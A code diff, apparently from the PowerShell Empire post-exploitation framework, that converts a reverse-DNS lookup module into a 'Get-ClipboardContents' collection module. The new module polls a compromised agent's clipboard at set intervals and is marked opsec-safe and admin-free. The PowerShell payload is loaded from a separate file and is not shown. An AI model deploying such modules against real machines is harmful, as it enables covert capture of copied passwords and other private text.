@@ -1,16 +1,15 @@
 from lib.common import helpers
 import os
-
 class Module:
 
     def __init__(self, mainMenu, params=[]):
 
         self.info = {
-            'Name': 'Invoke-ReverseDNSLookup',
+            'Name': 'Get-ClipboardContents',
 
-            'Author': ['DarkOperator'],
+            'Author': ['@harmj0y'],
 
-            'Description': ('Performs a DNS Reverse Lookup of a given IPv4 IP Range.'),
+            'Description': ('Monitors the clipboard on a specified interval for changes to copied text.'),
 
             'Background' : True,
 
@@ -19,11 +18,11 @@ class Module:
             'NeedsAdmin' : False,
 
             'OpsecSafe' : True,
-            
+
             'MinPSVersion' : '2',
             
             'Comments': [
-                'https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1'
+                'http://brianreiter.org/2010/09/03/copy-and-paste-with-clipboard-from-powershell/'
             ]
         }
 
@@ -36,22 +35,22 @@ class Module:
                 'Required'      :   True,
                 'Value'         :   ''
             },
-            'Range' : {
-                'Description'   :   "Range to perform reverse DNS on.",
+            'CollectionLimit' : {
+                'Description'   :   "Specifies the interval in minutes to capture clipboard text. Defaults to indefinite collection.",
                 'Required'      :   False,
                 'Value'         :   ''
             },
-            'CIDR' : {
-                'Description'   :   "CIDR to perform reverse DNS on.",
-                'Required'      :   False,
-                'Value'         :   ''
+            'PollInterval' : {
+                'Description'   :   "Interval (in seconds) to check the clipboard for changes, defaults to 15 seconds.",
+                'Required'      :   True,
+                'Value'         :   '15'
             }
         }
 
         # save off a copy of the mainMenu object to access external functionality
         #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
-
+        
         for param in params:
             # parameter format is [Name, Value]
             option, value = param
@@ -62,7 +61,7 @@ class Module:
     def generate(self):
 
         # read in the common module source code
-        moduleSource = self.mainMenu.installPath + "/data/module_source/situational_awareness/network/Invoke-ReverseDNSLookup.ps1".replace('/', os.sep)
+        moduleSource = self.mainMenu.installPath + "/data/module_source/collection/Get-ClipboardContents.ps1".replace('/', os.sep)
 
         try:
             f = open(moduleSource, 'r')
@@ -75,7 +74,7 @@ class Module:
 
         script = moduleCode
 
-        script += "Invoke-ReverseDNSLookup"
+        script += "Get-ClipboardContents"
 
         for option,values in self.options.iteritems():
             if option.lower() != "agent":
@@ -84,9 +83,6 @@ class Module:
                         # if we're just adding a switch
                         script += " -" + str(option)
                     else:
-                        script += " -" + str(option) + " " + str(values['Value']) 
-
-        # only return objects where HostName is not an IP (i.e. the address resolves)
-        script += " | % {try{$entry=$_; $ipObj = [System.Net.IPAddress]::parse($entry.HostName); if(-not [System.Net.IPAddress]::tryparse([string]$_.HostName, [ref]$ipObj)) { $entry }} catch{$entry} } | Select-Object HostName, AddressList | ft -autosize | Out-String | %{$_ + \"`n\"}"
+                        script += " -" + str(option) + " " + str(values['Value'])
 
         return script
